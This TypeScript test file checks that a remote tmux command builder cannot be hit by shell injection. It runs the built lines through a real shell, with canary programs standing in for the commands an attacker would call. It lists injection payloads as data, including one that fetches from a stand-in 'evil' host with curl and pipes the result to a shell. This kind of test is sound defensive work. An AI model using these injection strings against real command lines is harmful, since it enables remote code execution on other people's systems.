// SECURITY — the remote command line, executed by a REAL /bin/sh.
//
// The sibling `control-master.injection.test.ts` asserts structure with a hand-rolled parser. This
// file trusts no parser of ours: it runs the line `remoteTmuxPtyArgs` builds through the actual
// shell, with a stub `tmux` on PATH that dumps its argv NUL-separated and canary programs that
// leave a marker file if an injection ever reaches them. If a payload becomes command structure,
// a marker appears.
//
// It exists because a parser-only test PASSED the `$'` defect: `posixQuote` was correct, but the
// quoted string was handed to `String.prototype.replace` as a STRING replacement, where `$'`
// expands to the text following the match. Only execution catches a class of bug like that
// reliably — the parser has to be taught each new trick, the shell already knows them all.
import { describe, expect, it, beforeAll } from 'vitest'
import { execFileSync } from 'child_process'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { remoteHookEnvArgs, remoteTmuxPtyArgs } from './control-master'
import { accountTmuxEnvArgs, remoteAccountConfigDirAbs } from '../claude-accounts-core'
import { isSafeNodeId, isSafeRemoteHome } from '../remote-safety'

const conn = { host: 'h.example.com', user: 'deploy', port: 2222, identityFile: '/k/id' }

let binDir: string
let markerDir: string

beforeAll(() => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ntsh-'))
  binDir = path.join(root, 'bin')
  markerDir = path.join(root, 'markers')
  fs.mkdirSync(binDir)
  fs.mkdirSync(markerDir)
  // stub tmux: prints its argv NUL-separated, so the test sees exactly what tmux would receive.
  fs.writeFileSync(path.join(binDir, 'tmux'), `#!/bin/sh\nfor a in "$@"; do printf '%s\\0' "$a"; done\n`, {
    mode: 0o755
  })
  // canaries an injection would reach for; each drops a marker file.
  for (const name of ['curl', 'id', 'whoami', 'rm', 'sh_pwn']) {
    fs.writeFileSync(path.join(binDir, name), `#!/bin/sh\ntouch ${markerDir}/${name}\nexit 0\n`, {
      mode: 0o755
    })
  }
})

/** Run a built remote command line through a real sh; report tmux's argv and any canary fired. */
function runReal(cmd: string): { argv: string[]; markers: string[]; extraStdout: string } {
  fs.readdirSync(markerDir).forEach((f) => fs.unlinkSync(path.join(markerDir, f)))
  let out = ''
  try {
    out = execFileSync('/bin/sh', ['-c', cmd], {
      env: { PATH: `${binDir}:/usr/bin:/bin`, HOME: '/home/u' },
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    })
  } catch (e) {
    // A non-zero exit is not the subject — whether a canary RAN is. Keep whatever stdout arrived.
    out = String((e as { stdout?: string }).stdout ?? '')
  }
  const parts = out.split('\0')
  const trailing = parts.pop() ?? ''
  return { argv: parts, markers: fs.readdirSync(markerDir).sort(), extraStdout: trailing }
}

const build = (nodeId: string): string =>
  remoteTmuxPtyArgs(
    conn,
    '/s.sock',
    'nt-n1',
    '/home/u',
    undefined,
    undefined,
    remoteHookEnvArgs('/home/u/.nodeterm/hook-endpoint-p1.env', nodeId, '1', 'claude'),
    '/home/u/.nodeterm/tmux.conf'
  ).slice(-1)[0]

const PAYLOADS: Record<string, string> = {
  semicolon: 'n1;id;#',
  pipe: 'n1|sh_pwn',
  and: 'n1&&id',
  or: 'n1||id',
  cmdsub: 'n1$(id)',
  backtick: 'n1`id`',
  IFS: 'n1;curl${IFS}http://evil/x|sh_pwn;#',
  newline: 'n1\nid\n',
  cr: 'n1\rid',
  singleQuote: "n1'id'",
  alreadyQuoted: "'n1'",
  embeddedEscape: "n1'\\''id;#",
  embeddedEscape2: "a'\\''b",
  closeThenSub: "n1'$(id)'",
  closeThenNl: "n1'\nid\n'",
  glob: 'n1*',
  redirect: 'n1>/tmp/ntsh-pwn',
  bg: 'n1&',
  tilde: 'n1~/x',
  varExp: 'n1$HOME',
  dollarQuote: "n1$'\\x41'",
  bangHist: 'n1!!',
  brace: 'n1{a,b}',
  whitespace: 'n1\t tab and space',
  // `String.prototype.replace` replacement patterns — the class that defeated the first fix.
  replMatch: 'n1$&',
  replBefore: 'n1$`',
  replAfter: "n1$'",
  replDollar: 'n1$$'
}

describe('REAL sh: a payload node id is one literal argument, never command structure', () => {
  for (const [name, payload] of Object.entries(PAYLOADS)) {
    it(`${name}: ${JSON.stringify(payload)}`, () => {
      const { argv, markers, extraStdout } = runReal(build(payload))
      expect(markers, `a canary EXECUTED for ${name}`).toEqual([])
      expect(extraStdout, `stray stdout for ${name}`).toBe('')
      expect(argv, `payload was not one literal arg for ${name}`).toContain(`NODETERM_NODE_ID=${payload}`)
      expect(argv.slice(0, 2)).toEqual(['-L', 'nodeterm-rmt'])
      expect(argv.filter((a) => a === 'new-session')).toHaveLength(1)
      expect(argv).toContain('nt-n1')
      expect(argv).toContain('/home/u')
    })
  }
})

/**
 * The four vectors an adversarial review proved still landed after the FIRST version of this fix.
 * Each uses a node id that passes `isSafeNodeId` — the escape rides a different project.json field
 * — so they are regressions against the splice, not against the id validator.
 */
describe('REAL sh: the four vectors that survived the first fix', () => {
  it('A: node.data.agentId carries the escape, node id is legitimate', () => {
    expect(isSafeNodeId('term-mabc-3')).toBe(true)
    const cmd = remoteTmuxPtyArgs(
      conn,
      '/s.sock',
      'nt-term-mabc-3',
      '/srv/app;id;#',
      undefined,
      undefined,
      remoteHookEnvArgs('/home/u/.nodeterm/hook-endpoint-p1.env', 'term-mabc-3', '1', "claude$'"),
      '/home/u/.nodeterm/tmux.conf'
    ).slice(-1)[0]
    const { argv, markers } = runReal(cmd)
    expect(markers).toEqual([])
    expect(argv).toContain('/srv/app;id;#') // the cwd stayed DATA
  })

  it('B: a remote $HOME carrying the ansi-c quoting vector', () => {
    const home = "/home/u$'x"
    // The predicate USED to accept this — it is a legal path, and quoting at the splice was the
    // whole defence. It refuses `$` now (the per-node identity series consolidated the two
    // independently-written home predicates onto the stricter one), so this value can no longer
    // reach here through `setup`. The splice is still proven inert below, on purpose: a splice that
    // is only safe because a validator upstream happens to be strict is one refactor from an RCE.
    expect(isSafeRemoteHome(home), 'refused at the boundary now — but not RELIED on here').toBe(false)
    const cmd = remoteTmuxPtyArgs(
      conn,
      '/s.sock',
      'nt-n1',
      '/srv/app;id;#',
      undefined,
      undefined,
      remoteHookEnvArgs(`${home}/.nodeterm/hook-endpoint-p1.env`, 'term-mabc-3', '1', 'claude'),
      '/home/u/.nodeterm/tmux.conf'
    ).slice(-1)[0]
    const { argv, markers } = runReal(cmd)
    expect(markers).toEqual([])
    expect(argv).toContain(`NODETERM_HOOK_ENDPOINT=${home}/.nodeterm/hook-endpoint-p1.env`)
  })

  it('C: CLAUDE_CONFIG_DIR built from that same $HOME', () => {
    const dir = remoteAccountConfigDirAbs("/home/u$'x", 'work')
    const cmd = remoteTmuxPtyArgs(conn, '/s.sock', 'nt-n1', '/srv/app;id;#', undefined, undefined, [
      ...accountTmuxEnvArgs(dir)
    ]).slice(-1)[0]
    const { argv, markers } = runReal(cmd)
    expect(markers).toEqual([])
    expect(argv).toContain(`CLAUDE_CONFIG_DIR=${dir}`)
  })

  it('D: programArgs (a resume session id) in the region after the splice', () => {
    const cmd = remoteTmuxPtyArgs(
      conn,
      '/s.sock',
      'nt-n1',
      '/srv/app',
      'claude',
      ['--resume', 'sess;id;#'],
      remoteHookEnvArgs('/ep', 'term-mabc-3', '1', "claude$'")
    ).slice(-1)[0]
    const { argv, markers } = runReal(cmd)
    expect(markers).toEqual([])
    expect(argv).toContain('sess;id;#')
  })
})
